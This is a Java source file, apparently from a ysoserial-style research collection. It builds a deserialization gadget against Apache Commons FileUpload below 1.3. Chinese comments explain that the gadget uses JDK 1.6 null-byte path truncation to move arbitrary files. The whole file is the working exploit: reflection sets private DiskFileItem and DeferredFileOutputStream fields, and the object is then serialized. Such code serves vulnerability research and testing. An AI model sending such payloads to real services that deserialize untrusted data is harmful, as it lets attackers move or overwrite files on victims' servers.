package org.su18.serialize.ysoserial.FileUpload;

import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.io.output.DeferredFileOutputStream;
import org.su18.serialize.ysoserial.Utils.SerializeUtil;

import java.io.File;
import java.lang.reflect.Field;

/**
 * 在 1.3 版本以下，配合 JDK 1.6 的空字节截断，可以完成任意文件的移动
 *
 * @author su18
 */
public class FileUploadForMove {

	public static void main(String[] args) throws Exception {

		// 源文件
		File source = new File("/Users/phoebe/Downloads/ry.sql");
		// 目的文件，使用 \0 截断
		File target = new File("/Users/phoebe/Downloads/123.sql\0");

		// 创建 dfos 对象
		DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, source);

		// 要保证 DiskFileItem cachedContent 为 null
		Field mos = DeferredFileOutputStream.class.getDeclaredField("memoryOutputStream");
		mos.setAccessible(true);
		mos.set(dfos, null);

		// 使用 repository 初始化反序列化的 DiskFileItem 对象
		DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, target);

		// 序列化时 writeObject 要求 dfos 不能为 null
		Field dfosFile = DiskFileItem.class.getDeclaredField("dfos");
		dfosFile.setAccessible(true);
		dfosFile.set(diskFileItem, dfos);

		// 反射将 dfosFile 写入
		Field field2 = DiskFileItem.class.getDeclaredField("dfosFile");
		field2.setAccessible(true);
		field2.set(diskFileItem, source);


		SerializeUtil.writeObjectToFile(diskFileItem);
		SerializeUtil.readFileObject();

	}

}
